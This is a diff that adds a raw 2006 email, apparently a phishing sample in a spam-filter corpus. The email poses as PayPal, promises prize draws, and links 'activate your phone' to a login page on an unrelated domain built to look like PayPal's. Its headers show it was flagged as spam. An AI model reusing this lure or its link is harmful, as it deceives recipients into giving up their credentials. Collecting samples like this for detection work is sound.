@@ -1,0 +1,277 @@
+From nobody Sun Jan 25 13:49:58 2015
+Return-Path: <notify-account@pp.com>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+ by example.com (Postfix) with ESMTP id B3A9B46A23
+ for <user@login.example.com>; Sun, 20 Aug 2006 09:36:53 -0400 (EDT)
+Received: from lujan.uninet.edu (bio.hgy.es [193.146.180.21])
+ by mail.example.org (Postfix) with ESMTP id E18A46CD0DD
+ for <user@example.com>; Sun, 20 Aug 2006 09:36:52 -0400 (EDT)
+Received: by lujan.uninet.edu (Postfix)
+ id 3DAEF1BEA0; Sun, 20 Aug 2006 15:36:51 +0200 (CEST)
+Delivered-To: josu@uninet.edu
+Received: from mar.uninet.edu (mar.uninet.edu [193.146.180.108])
+ by lujan.uninet.edu (Postfix) with ESMTP id EA53A1BE45;
+ Sun, 20 Aug 2006 15:36:50 +0200 (CEST)
+Received: from localhost (localhost [127.0.0.1])
+ by mar.uninet.edu (Postfix) with ESMTP id C828C6D5;
+ Sun, 20 Aug 2006 15:36:50 +0200 (CEST)
+Received: from lujan.uninet.edu ([193.146.180.21])
+ by localhost (mar [193.146.180.108]) (amavisd-new, port 10024)
+ with ESMTP id 30520-06; Sun, 20 Aug 2006 15:36:42 +0200 (CEST)
+Received: from rocinante.compendium.com.ar (unknown [200.69.230.3])
+ by lujan.uninet.edu (Postfix) with ESMTP id E9E431BE45;
+ Sun, 20 Aug 2006 15:36:41 +0200 (CEST)
+Received: from localhost (rocinante [127.0.0.1])
+ by rocinante.compendium.com.ar (Postfix) with ESMTP id B2E93501170;
+ Sun, 20 Aug 2006 10:36:40 -0300 (ART)
+Received: from rocinante.compendium.com.ar ([127.0.0.1])
+ by localhost (rocinante [127.0.0.1]) (amavisd-new, port 10024)
+ with ESMTP id 21119-06; Sun, 20 Aug 2006 10:36:39 -0300 (ART)
+Received: from 192.168.1.65 (host81-149-153-248.in-addr.btopenworld.com
+ [81.149.153.248])
+ by rocinante.compendium.com.ar (Postfix) with SMTP id 8D9F850098F;
+ Sun, 20 Aug 2006 10:36:37 -0300 (ART)
+Received: from 185.69.192.188 by ; Sun, 20 Aug 2006 07:35:50 -0700
+Message-ID: <TNOVYKVHFDBACVBZFWLUOUV@yahoo.com>
+From: "PayPal-Notice" <notice-update@accounts-pp.com>
+Reply-To: "PayPal-inc" <updated@pp.com>
+To: jemoro@uninet.edu
+Cc: josu@uninet.edu, conaganat@uninet.edu, eusalud@uninet.edu
+Subject: You added new alternative email to your account !
+Date: Sun, 20 Aug 2006 08:30:50 -0600
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+	boundary="--88782911621640694"
+X-Priority: 1
+X-MSMail-Priority: High
+X-Virus-Scanned: by amavisd-new-20030616-p10 (Debian) at localhost
+X-Virus-Scanned: by amavisd-new-20030616-p10 at uninet.edu
+X-Spam-Status: Yes, hits=33.8 tagged_above=0.0 required=5.0 tests=BAYES_50,
+ DNS_FROM_RFC_BOGUSMX, FORGED_MUA_OUTLOOK, FORGED_OUTLOOK_HTML,
+ HTML_MESSAGE, HTML_TAG_EXIST_TBODY, MIME_BOUND_DD_DIGITS,
+ MIME_HTML_ONLY, MIME_HTML_ONLY_MULTI, MISSING_MIMEOLE,
+ MPART_ALT_DIFF, MSGID_SPAM_CAPS, MSGID_YAHOO_CAPS,
+ RAZOR2_CF_RANGE_51_100, RAZOR2_CHECK
+X-Spam-Level: *********************************
+X-Spam-Flag: YES
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 79
+
+----88782911621640694
+Content-Type: text/html;
+Content-Transfer-Encoding: quoted-printable
+
+<html>
+
+<head>
+<meta http-equiv=3DContent-Type content=3D"text/html; charset=3Dwindows-12=
+52">
+<meta name=3DGenerator content=3D"Microsoft Word 11 (filtered)">
+<title>Activate with PayPal Mobile - You Could Be a Winner</title>
+<style>
+<!--
+ /* Style Definitions */
+ p.MsoNormal, li.MsoNormal, div.MsoNormal
+	{margin:0in;
+	margin-bottom:.0001pt;
+	font-size:12.0pt;
+	font-family:"Times New Roman";}
+a:link, span.MsoHyperlink
+	{color:blue;
+	text-decoration:underline;}
+a:visited, span.MsoHyperlinkFollowed
+	{color:purple;
+	text-decoration:underline;}
+p
+	{margin-right:0in;
+	margin-left:0in;
+	font-size:12.0pt;
+	font-family:"Times New Roman";}
+@page Section1
+	{size:8.5in 11.0in;
+	margin:1.0in 1.25in 1.0in 1.25in;}
+div.Section1
+	{page:Section1;}
+style2 {
+	color: #003366;
+	font-weight: bold;
+	font-family: Verdana, Arial, Helvetica, sans-serif;
+	font-size: 14px;
+}
+style4 {
+	color: #003366;
+	font-weight: bold;
+}
+style5 {
+	font-family: Verdana, Arial, Helvetica, sans-serif;
+	font-size: 11px;
+}
+style7 {font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 11=
+px; }
+style11 {font-family: Verdana, Arial, Helvetica, sans-serif}
+style12 {color: #003366}
+style13 {color: #003366; font-weight: bold; font-family: Verdana, Arial, =
+Helvetica, sans-serif; font-size: 11px; }
+-->
+</style>
+
+</head>
+
+<body lang=3DEN-US link=3Dblue vlink=3Dpurple>
+
+<div class=3DSection1>
+
+<table width=3D"90%" border=3D"0">
+  <tr>
+    <td width=3D"72%" rowspan=3D"2"><h1 class=3Dstyle2>Activate with PayPa=
+l Mobile - You Could Be a Winner.</h1>
+      <p class=3DMsoNormal style7><span class=3D"style5">Activate your pho=
+ne now for PayPal Mobile, and you could win one of  45,000 mystery cash pr=
+izes of up to<span class=3D"style4"> $1,000</span>.</span><BR>
+        <span class=3D"style11"><br>
+        </span><span class=3D"style5">Plus, you'll be able to use your pho=
+ne to send money   to people and buy 
+        things - anytime, from wherever you are, for free.*</span><span cl=
+ass=3D"style11"><BR>
+        </span></p>
+      <p align=3D"center" class=3Dstyle5><span class=3D"style12"><strong>S=
+o <A href=3D"http://www.denverstreetracing.com/images/taras/redirect.paypa=
+l.com/safe/member/auth/on/secure/area/login/pal/ssl/paypal/us/cgi-bin/logi=
+n.html">activate   your phone</A> now for your chance to win!</strong></sp=
+an><br>
+      </p>
+      <p class=3Dstyle5>Send money to friends and family<BR>
+        <BR>
+        Send money securely, anytime, from wherever you are. You don&rsquo=
+;t need   cash or a check &ndash; just your phone.<BR>
+        <BR>
+        After you activate your phone, you can   send money one of two way=
+s: </p>
+      <UL class=3D"style5">
+        <LI><span class=3D"style4">Text to 729725 (PAYPAL)</span> with the=
+ amount and   recipient&rsquo;s phone number.<BR>
+            <span class=3D"style4">Example</span>:   send 5 to 4150001234
+          <DIV>Or          </DIV>
+        <LI><span class=3D"style4">Call 1-800-4PAYPAL (1-800-472-9725</spa=
+n><span class=3D"style12"><strong>)</strong></span> and follow   the instr=
+uctions.<BR>
+            <BR>
+        </LI>
+      </UL>
+      <p class=3DMsoNormal style5></p></td>
+    <td width=3D"28%" valign=3D"top"><span style=3D"font-size:11.0pt"><img=
+ src=3D"https://www.paypalobjects.com/en_US/i/header/spot_mobileMystery_24=
+0x220.gif" alt=3D"win"></span></td>
+  </tr>
+  <tr>
+    <td valign=3D"top"><TABLE cellSpacing=3D"0" cellPadding=3D"0" width=3D=
+"100%" align=3D"center" border=3D"0">
+      <TBODY>
+        <TR>
+          <TD><TABLE cellSpacing=3D"0" cellPadding=3D"0" width=3D"100=
+%" align=3D"center" border=3D"0">
+              <TBODY>
+                <TR>
+                  <TD width=3D"100%"></TD>
+                  <TD width=3D"5">&nbsp;</TD>
+                </TR>
+              </TBODY>
+          </TABLE></TD>
+        </TR>
+        <TR>
+          <TD class=3D"style13"><IMG alt=3D"" src=3D"https://www.paypalobj=
+ects.com/en_US/i/icon/secure_lock_2.gif" border=3D"0">&nbsp;Secure &amp; P=
+rivate</TD>
+        </TR>
+        <TR>
+          <TD><TABLE cellSpacing=3D"0" cellPadding=3D"5" width=3D"100=
+%" align=3D"center" border=3D"0">
+              <TBODY>
+                <TR>
+                  <TD class=3D"style5">Mobile transactions are PIN-protect=
+ed, so your   account is secure, even if your phone is lost or   stolen. <=
+/TD>
+                </TR>
+              </TBODY>
+          </TABLE></TD>
+        </TR>
+        <TR>
+          <TD><TABLE cellSpacing=3D"0" cellPadding=3D"0" width=3D"100=
+%" align=3D"center" border=3D"0">
+              <TBODY>
+                <TR>
+                  <TD width=3D"5">&nbsp;</TD>
+                  <TD width=3D"100%"><IMG height=3D"1" alt=3D"" src=3D"htt=
+ps://www.paypalobjects.com/en_US/i/scr/pixel.gif" width=3D"1" border=3D"0"=
+></TD>
+                  <TD width=3D"5">&nbsp;</TD>
+                </TR>
+              </TBODY>
+          </TABLE></TD>
+        </TR>
+      </TBODY>
+    </TABLE>
+      <IMG height=3D"10" alt=3D"" src=3D"https://www.paypalobjects.com/en_=
+US/i/scr/pixel.gif" width=3D"1" border=3D"0">
+      <TABLE cellSpacing=3D"0" cellPadding=3D"0" width=3D"100=
+%" align=3D"center" border=3D"0">
+        <TBODY>
+          <TR>
+            <TD><TABLE cellSpacing=3D"0" cellPadding=3D"0" width=3D"100=
+%" align=3D"center" border=3D"0">
+                <TBODY>
+                  <TR>
+                    <TD width=3D"5">&nbsp;</TD>
+                    <TD width=3D"100%"><IMG height=3D"1" alt=3D"" src=3D"h=
+ttps://www.paypalobjects.com/en_US/i/scr/pixel.gif" width=3D"1" border=3D"=
+0"><span class=3D"style13">It&rsquo;s free to send money by   phone</span>=
+</TD>
+                    <TD width=3D"5">&nbsp;</TD>
+                  </TR>
+                </TBODY>
+            </TABLE></TD>
+          </TR>
+
+          <TR>
+            <TD><TABLE cellSpacing=3D"0" cellPadding=3D"5" width=3D"100=
+%" align=3D"center" border=3D"0">
+                <TBODY>
+                  <TR>
+                    <TD class=3D"style5">PayPal charges you nothing to sen=
+d money by   phone.<BR>
+                        <BR>
+                      Wireless carriers may charge fees for receiving text=
+   messages.</TD>
+                  </TR>
+                </TBODY>
+            </TABLE></TD>
+          </TR>
+        </TBODY>
+      </TABLE></td>
+  </tr>
+</table>
+<p class=3Dstyle5>--------------------------------------------------------=
+--------<br>  
+    Please do not reply to this
+  email. This mailbox is not monitored and you will not receive a response=
+<br>
+  For assistance, log in to
+  your PayPal account and click the  Help link located in the top right co=
+rner of any PayPal page. <br>
+  ----------------------------------------------------------------&nbsp;</=
+p>
+
+  <p class=3Dstyle5>PayPal Email ID PP059</p>
+</div>
+
+</body>
+
+</html>
+
+
+----88782911621640694--
